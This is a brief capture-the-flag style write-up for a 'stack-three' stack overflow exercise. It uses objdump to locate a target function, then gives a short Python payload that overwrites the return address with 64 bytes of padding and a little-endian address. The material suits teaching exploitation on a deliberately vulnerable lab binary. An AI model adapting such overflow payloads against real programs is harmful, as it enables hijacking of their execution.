### Stackthree 
This one was relatively easier with lesser embarassment :P
So first thing to do is use objdump to disassemble the code and find the function locations.
`objdump -D -M intel ./stack-three`
With this we find out the offset of our function and then we simply had to overflow it to 
that location to get it sorted and executed.

### Code
```
padding = 'A'*64
offset = '\x00\x40\x06\x9d'
print(padding+offset[::-1])
```


### Creds
```
No flags in here :P
```


 ~Kurama
